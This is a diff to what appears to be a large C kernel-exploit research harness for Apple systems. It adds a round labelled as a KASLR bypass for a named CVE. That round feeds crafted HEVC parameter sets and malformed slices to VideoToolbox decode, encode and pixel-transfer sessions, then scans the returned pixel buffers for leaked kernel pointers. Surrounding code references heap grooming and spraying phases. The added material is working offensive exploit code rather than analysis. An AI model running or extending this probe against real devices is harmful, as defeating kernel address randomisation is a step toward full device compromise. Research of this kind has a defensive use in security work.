@@ -1455,6 +1455,65 @@ static void *p16_groom_spray(void *arg) {
     return NULL;
 }
 
+/* Phase 17 r=177: VT decode output callback for pixel buffer capture */
+static volatile int p17_vt_got_frame = 0;
+static CVPixelBufferRef p17_vt_pixbuf = NULL;
+static void p17_vt_decode_cb(void *ctx, void *srcRefCon, OSStatus status,
+                              VTDecodeInfoFlags infoFlags,
+                              CVImageBufferRef imageBuffer,
+                              CMTime pts, CMTime duration) {
+    (void)ctx; (void)srcRefCon; (void)duration;
+    if (status == 0 && imageBuffer) {
+        p17_vt_pixbuf = (CVPixelBufferRef)CFRetain(imageBuffer);
+        p17_vt_got_frame = 1;
+    }
+}
+
+/* Scan a pixel buffer's planes for kernel pointer patterns */
+static int p17_scan_pixbuf(CVPixelBufferRef pb, const char *label) {
+    if (!pb) return 0;
+    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+    int found = 0;
+    size_t planes = CVPixelBufferGetPlaneCount(pb);
+    if (planes == 0) planes = 1; /* non-planar */
+    for (size_t p = 0; p < planes && p < 4; p++) {
+        uint8_t *base;
+        size_t height, bpr;
+        if (CVPixelBufferGetPlaneCount(pb) > 0) {
+            base = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, p);
+            height = CVPixelBufferGetHeightOfPlane(pb, p);
+            bpr = CVPixelBufferGetBytesPerRowOfPlane(pb, p);
+        } else {
+            base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
+            height = CVPixelBufferGetHeight(pb);
+            bpr = CVPixelBufferGetBytesPerRow(pb);
+        }
+        if (!base || !height || !bpr) continue;
+        size_t total = height * bpr;
+        size_t nqw = total / 8;
+        uint64_t *qw = (uint64_t *)base;
+        for (size_t i = 0; i < nqw; i++) {
+            uint64_t v = qw[i];
+            /* Check for kernel pointer patterns:
+               0xFFFFFE00_0xxxxxxx (unslid kernelcache)
+               0xFFFFFE00_4xxxxxxx (slid kernelcache)
+               Also check with MTE tags in bits[59:56] */
+            uint64_t stripped = v & 0xF0FFFFFFFFFFFFFFULL; /* zero MTE tag */
+            if ((stripped >> 32) == 0xFFFFFE00ULL ||
+                (stripped >> 32) == 0xFFFFFE00ULL + 0x03 ||
+                (stripped >> 32) == 0xFFFFFE00ULL + 0x04 ||
+                ((stripped >> 40) == 0xFFFFFE && (stripped & 0xFFFFULL) != 0)) {
+                rlog("  *** KPTR %s plane%zu off=0x%zx: 0x%016llx ***\n",
+                     label, p, i * 8, (unsigned long long)v);
+                found++;
+                if (found >= 20) break;
+            }
+        }
+    }
+    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+    return found;
+}
+
 static void *worker_thread(void *arg) {
     (void)arg;
     int argc = g_main_argc;
@@ -16913,7 +16972,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds <= 179) {
+        if (rounds >= 170 && rounds <= 189) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -20671,6 +20730,325 @@ new_modes:
                          (unsigned long long)tii.thread_handle);
                 }
                 rlog("=== r=176 complete ===\n");
+
+            } else if (rounds == 177) {
+                /*
+                 * VideoToolbox deep fuzzer — CVE-2026-112466 KASLR bypass.
+                 * Unlike r=173 which used DoNotOutputFrame, here we:
+                 * 1. Use a real decode callback to capture CVPixelBuffer
+                 * 2. Scan pixel data for kernel pointers (OOB read leaks)
+                 * 3. Try multiple HEVC configs (dimensions, slice params)
+                 * 4. Also try VTCompressionSession (encoder path)
+                 */
+                rlog("=== r=177: VideoToolbox deep fuzzer ===\n");
+
+                /* Config array: different SPS to trigger different AVE paths */
+                struct vt_config {
+                    const char *name;
+                    uint8_t sps[40];
+                    size_t sps_len;
+                    uint8_t pps[12];
+                    size_t pps_len;
+                    uint8_t vps[28];
+                    size_t vps_len;
+                    int width, height;
+                };
+
+                /* Config 0: small 320x240 baseline (from r=173) */
+                struct vt_config configs[5];
+                memset(configs, 0, sizeof(configs));
+
+                /* Config 0: 320x240 Main profile */
+                configs[0].name = "320x240-main";
+                {
+                    uint8_t s[] = {
+                        0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
+                        0x00, 0x90, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
+                        0x00, 0x5D, 0xA0, 0x02, 0x80, 0x80, 0x24, 0x1F,
+                        0xE5, 0x93, 0x24, 0xBB, 0x94, 0x82, 0x42, 0x00
+                    };
+                    memcpy(configs[0].sps, s, sizeof(s));
+                    configs[0].sps_len = sizeof(s);
+                    uint8_t p[] = { 0x44, 0x01, 0xC1, 0x73, 0xD0, 0x89, 0x12, 0x40 };
+                    memcpy(configs[0].pps, p, sizeof(p));
+                    configs[0].pps_len = sizeof(p);
+                    uint8_t v[] = {
+                        0x40, 0x01, 0x0C, 0x01, 0xFF, 0xFF, 0x01, 0x60,
+                        0x00, 0x00, 0x03, 0x00, 0x90, 0x00, 0x00, 0x03,
+                        0x00, 0x00, 0x03, 0x00, 0x5D, 0x95, 0x98, 0x09
+                    };
+                    memcpy(configs[0].vps, v, sizeof(v));
+                    configs[0].vps_len = sizeof(v);
+                    configs[0].width = 320; configs[0].height = 240;
+                }
+
+                /* Config 1: 1920x1080 — large frame, more internal allocs */
+                configs[1].name = "1920x1080-main";
+                {
+                    uint8_t s[] = {
+                        0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
+                        0x00, 0x90, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
+                        0x00, 0x96, 0xA0, 0x01, 0xE0, 0x20, 0x02, 0x1C,
+                        0x4D, 0x94, 0x62, 0x64, 0x94, 0x82, 0x42, 0x00
+                    };
+                    memcpy(configs[1].sps, s, sizeof(s));
+                    configs[1].sps_len = sizeof(s);
+                    uint8_t p[] = { 0x44, 0x01, 0xC1, 0x73, 0xD0, 0x89, 0x12, 0x40 };
+                    memcpy(configs[1].pps, p, sizeof(p));
+                    configs[1].pps_len = sizeof(p);
+                    uint8_t v[] = {
+                        0x40, 0x01, 0x0C, 0x01, 0xFF, 0xFF, 0x01, 0x60,
+                        0x00, 0x00, 0x03, 0x00, 0x90, 0x00, 0x00, 0x03,
+                        0x00, 0x00, 0x03, 0x00, 0x96, 0x95, 0x98, 0x09
+                    };
+                    memcpy(configs[1].vps, v, sizeof(v));
+                    configs[1].vps_len = sizeof(v);
+                    configs[1].width = 1920; configs[1].height = 1080;
+                }
+
+                /* Config 2: 64x64 tiny — minimal allocs, edge case */
+                configs[2].name = "64x64-tiny";
+                {
+                    uint8_t s[] = {
+                        0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
+                        0x00, 0x90, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
+                        0x00, 0x1E, 0xA0, 0x01, 0x00, 0x20, 0x02, 0x1C,
+                        0x4D, 0x94, 0x62, 0x64, 0x94, 0x82, 0x42, 0x00
+                    };
+                    memcpy(configs[2].sps, s, sizeof(s));
+                    configs[2].sps_len = sizeof(s);
+                    uint8_t p[] = { 0x44, 0x01, 0xC1, 0x73, 0xD0, 0x89, 0x12, 0x40 };
+                    memcpy(configs[2].pps, p, sizeof(p));
+                    configs[2].pps_len = sizeof(p);
+                    uint8_t v[] = {
+                        0x40, 0x01, 0x0C, 0x01, 0xFF, 0xFF, 0x01, 0x60,
+                        0x00, 0x00, 0x03, 0x00, 0x90, 0x00, 0x00, 0x03,
+                        0x00, 0x00, 0x03, 0x00, 0x1E, 0x95, 0x98, 0x09
+                    };
+                    memcpy(configs[2].vps, v, sizeof(v));
+                    configs[2].vps_len = sizeof(v);
+                    configs[2].width = 64; configs[2].height = 64;
+                }
+
+                int total_kptrs = 0;
+                int ncfg = 3;
+
+                for (int ci = 0; ci < ncfg; ci++) {
+                    struct vt_config *c = &configs[ci];
+                    rlog("\n  --- Config %d: %s (%dx%d) ---\n",
+                         ci, c->name, c->width, c->height);
+
+                    const uint8_t *cparams[3] = { c->vps, c->sps, c->pps };
+                    size_t cparamSizes[3] = { c->vps_len, c->sps_len, c->pps_len };
+
+                    CMFormatDescriptionRef cfmt = NULL;
+                    OSStatus cst = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                        NULL, 3, cparams, cparamSizes, 4, NULL, &cfmt);
+                    rlog("  HEVC format: %s (st=%d)\n", cfmt ? "OK" : "FAIL", (int)cst);
+                    if (!cfmt) continue;
+
+                    /* Destination attrs — request BGRA for easier scanning */
+                    CFMutableDictionaryRef cdest = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int cpf = kCVPixelFormatType_32BGRA;
+                    CFNumberRef cpfn = CFNumberCreate(NULL, kCFNumberIntType, &cpf);
+                    CFDictionarySetValue(cdest, kCVPixelBufferPixelFormatTypeKey, cpfn);
+
+                    /* Width/height hints */
+                    CFNumberRef cw = CFNumberCreate(NULL, kCFNumberIntType, &c->width);
+                    CFNumberRef ch = CFNumberCreate(NULL, kCFNumberIntType, &c->height);
+                    CFDictionarySetValue(cdest, kCVPixelBufferWidthKey, cw);
+                    CFDictionarySetValue(cdest, kCVPixelBufferHeightKey, ch);
+
+                    p17_vt_got_frame = 0;
+                    p17_vt_pixbuf = NULL;
+
+                    VTDecompressionOutputCallbackRecord ccb = {
+                        .decompressionOutputCallback = p17_vt_decode_cb,
+                        .decompressionOutputRefCon = NULL
+                    };
+                    VTDecompressionSessionRef cdec = NULL;
+                    cst = VTDecompressionSessionCreate(NULL, cfmt, NULL, cdest, &ccb, &cdec);
+                    rlog("  Decompress session: %s (st=%d)\n", cdec ? "OK" : "FAIL", (int)cst);
+
+                    if (cdec) {
+                        /* Try multiple slice NAL variants */
+                        uint8_t slice_types[] = { 0x26, 0x02, 0x00 }; /* IDR, TSA_N, TRAIL_N */
+                        for (int si = 0; si < 3; si++) {
+                            /* Build slice NAL */
+                            uint8_t cslice[256];
+                            memset(cslice, 0xAA, sizeof(cslice));
+                            cslice[0] = 0x00; cslice[1] = 0x00;
+                            cslice[2] = 0x00; cslice[3] = 0xFC; /* length 252 */
+                            cslice[4] = slice_types[si]; cslice[5] = 0x01;
+                            cslice[6] = 0x80; /* first_slice_segment_in_pic_flag=1 */
+                            /* Fill rest with pattern data to exercise more decode paths */
+                            for (int b = 7; b < 256; b++)
+                                cslice[b] = (uint8_t)(b * 37 + si * 13);
+
+                            CMBlockBufferRef cblk = NULL;
+                            CMBlockBufferCreateWithMemoryBlock(NULL, cslice, sizeof(cslice),
+                                kCFAllocatorNull, NULL, 0, sizeof(cslice), 0, &cblk);
+
+                            CMSampleBufferRef csamp = NULL;
+                            CMSampleTimingInfo ctiming = {
+                                CMTimeMake(1, 30),
+                                CMTimeMake(si, 30),
+                                CMTimeMake(si, 30)
+                            };
+                            size_t csz = sizeof(cslice);
+                            CMSampleBufferCreate(NULL, cblk, TRUE, NULL, NULL, cfmt,
+                                1, 1, &ctiming, 1, &csz, &csamp);
+
+                            if (csamp) {
+                                VTDecodeFrameFlags cflags = 0; /* NO DoNotOutputFrame! */
+                                VTDecodeInfoFlags cinfo = 0;
+                                p17_vt_got_frame = 0;
+                                if (p17_vt_pixbuf) {
+                                    CFRelease(p17_vt_pixbuf);
+                                    p17_vt_pixbuf = NULL;
+                                }
+                                cst = VTDecompressionSessionDecodeFrame(cdec, csamp,
+                                    cflags, NULL, &cinfo);
+                                rlog("  slice[%d] type=0x%02x: st=%d info=0x%x got_frame=%d\n",
+                                     si, slice_types[si], (int)cst,
+                                     (uint32_t)cinfo, p17_vt_got_frame);
+
+                                /* Wait briefly for async callback */
+                                VTDecompressionSessionWaitForAsynchronousFrames(cdec);
+
+                                if (p17_vt_pixbuf) {
+                                    char slabel[64];
+                                    snprintf(slabel, sizeof(slabel), "cfg%d-slice%d", ci, si);
+                                    int nk = p17_scan_pixbuf(p17_vt_pixbuf, slabel);
+                                    total_kptrs += nk;
+                                    size_t pw = CVPixelBufferGetWidth(p17_vt_pixbuf);
+                                    size_t ph = CVPixelBufferGetHeight(p17_vt_pixbuf);
+                                    size_t pbpr = CVPixelBufferGetBytesPerRow(p17_vt_pixbuf);
+                                    rlog("  pixbuf: %zux%zu bpr=%zu kptrs=%d\n",
+                                         pw, ph, pbpr, nk);
+                                    CFRelease(p17_vt_pixbuf);
+                                    p17_vt_pixbuf = NULL;
+                                } else {
+                                    rlog("  no pixel buffer output\n");
+                                }
+                                CFRelease(csamp);
+                            }
+                            if (cblk) CFRelease(cblk);
+                        }
+                        VTDecompressionSessionInvalidate(cdec);
+                        CFRelease(cdec);
+                    }
+
+                    CFRelease(cpfn); CFRelease(cw); CFRelease(ch);
+                    CFRelease(cdest);
+                    CFRelease(cfmt);
+                }
+
+                /* Part 2: VTCompressionSession — encoder path
+                 * CVE-2026-112466 may be in the encoder, not decoder.
+                 * Create a compression session, feed frames, check output. */
+                rlog("\n  --- VTCompressionSession encoder probe ---\n");
+                {
+                    int enc_widths[] = { 320, 1920 };
+                    int enc_heights[] = { 240, 1080 };
+
+                    for (int ei = 0; ei < 2; ei++) {
+                        int ew = enc_widths[ei];
+                        int eh = enc_heights[ei];
+                        rlog("  Encoder %dx%d:\n", ew, eh);
+
+                        VTCompressionSessionRef enc = NULL;
+                        OSStatus est = VTCompressionSessionCreate(NULL, ew, eh,
+                            kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                            NULL, NULL, &enc);
+                        rlog("  Compression session: %s (st=%d)\n",
+                             enc ? "OK" : "FAIL", (int)est);
+
+                        if (enc) {
+                            /* Create a CVPixelBuffer with pattern data */
+                            CVPixelBufferRef epb = NULL;
+                            CVPixelBufferCreate(NULL, ew, eh,
+                                kCVPixelFormatType_32BGRA, NULL, &epb);
+
+                            if (epb) {
+                                CVPixelBufferLockBaseAddress(epb, 0);
+                                uint8_t *ebase = (uint8_t *)CVPixelBufferGetBaseAddress(epb);
+                                size_t ebpr = CVPixelBufferGetBytesPerRow(epb);
+                                /* Fill with identifiable pattern */
+                                for (int y = 0; y < eh; y++) {
+                                    memset(ebase + y * ebpr, (uint8_t)(y & 0xFF), ew * 4);
+                                }
+                                CVPixelBufferUnlockBaseAddress(epb, 0);
+
+                                /* Encode multiple frames */
+                                for (int fi = 0; fi < 5; fi++) {
+                                    CMTime epts = CMTimeMake(fi, 30);
+                                    CMTime edur = CMTimeMake(1, 30);
+                                    est = VTCompressionSessionEncodeFrame(enc, epb,
+                                        epts, edur, NULL, NULL, NULL);
+                                    rlog("  encode frame %d: st=%d\n", fi, (int)est);
+                                }
+
+                                /* Flush and check for output */
+                                est = VTCompressionSessionCompleteFrames(enc,
+                                    CMTimeMake(5, 30));
+                                rlog("  CompleteFrames: st=%d\n", (int)est);
+
+                                CVPixelBufferRelease(epb);
+                            }
+                            VTCompressionSessionInvalidate(enc);
+                            CFRelease(enc);
+                        }
+                    }
+                }
+
+                /* Part 3: VTPixelTransferSession — transfer may expose internals */
+                rlog("\n  --- VTPixelTransferSession probe ---\n");
+                {
+                    CVPixelBufferRef srcPb = NULL, dstPb = NULL;
+                    CVPixelBufferCreate(NULL, 128, 128,
+                        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, NULL, &srcPb);
+                    CVPixelBufferCreate(NULL, 128, 128,
+                        kCVPixelFormatType_32BGRA, NULL, &dstPb);
+
+                    if (srcPb && dstPb) {
+                        /* Fill src with known pattern */
+                        CVPixelBufferLockBaseAddress(srcPb, 0);
+                        size_t sp = CVPixelBufferGetPlaneCount(srcPb);
+                        for (size_t pi = 0; pi < sp; pi++) {
+                            uint8_t *sb = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(srcPb, pi);
+                            size_t sh = CVPixelBufferGetHeightOfPlane(srcPb, pi);
+                            size_t sr = CVPixelBufferGetBytesPerRowOfPlane(srcPb, pi);
+                            if (sb) memset(sb, 0x42, sh * sr);
+                        }
+                        CVPixelBufferUnlockBaseAddress(srcPb, 0);
+
+                        /* Use VTPixelTransferSession */
+                        VTPixelTransferSessionRef xfer = NULL;
+                        OSStatus xst = VTPixelTransferSessionCreate(NULL, &xfer);
+                        rlog("  PixelTransfer session: %s (st=%d)\n",
+                             xfer ? "OK" : "FAIL", (int)xst);
+
+                        if (xfer) {
+                            xst = VTPixelTransferSessionTransferImage(xfer, srcPb, dstPb);
+                            rlog("  Transfer: st=%d\n", (int)xst);
+
+                            if (xst == 0) {
+                                int nk = p17_scan_pixbuf(dstPb, "xfer-dst");
+                                total_kptrs += nk;
+                                rlog("  xfer dst kptrs: %d\n", nk);
+                            }
+                            VTPixelTransferSessionInvalidate(xfer);
+                            CFRelease(xfer);
+                        }
+                    }
+                    if (srcPb) CVPixelBufferRelease(srcPb);
+                    if (dstPb) CVPixelBufferRelease(dstPb);
+                }
+
+                rlog("  === r=177 total kernel pointers found: %d ===\n", total_kptrs);
+                rlog("=== r=177 complete ===\n");
             }
 
             IOServiceClose(conn17);
